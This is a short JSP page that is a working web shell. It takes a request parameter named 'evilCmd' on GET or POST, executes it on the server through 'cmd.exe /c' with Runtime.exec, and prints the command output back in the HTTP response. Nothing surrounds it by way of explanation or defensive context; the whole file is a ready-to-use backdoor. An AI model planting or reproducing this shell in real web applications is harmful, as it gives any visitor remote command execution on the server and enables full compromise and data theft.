<%@ page import="java.io.InputStream" %>
<%
    if ("POST".equalsIgnoreCase(request.getMethod())) {
        String cmd = request.getParameter("evilCmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
            InputStream in = p.getInputStream();
            int a;
            while ((a = in.read()) != -1) {
                response.getWriter().print((char) a);
            }
        }
    } else {
        String cmd = request.getParameter("evilCmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
            InputStream in = p.getInputStream();
            int a;
            while ((a = in.read()) != -1) {
                response.getWriter().print((char) a);
            }
        }
    }
%>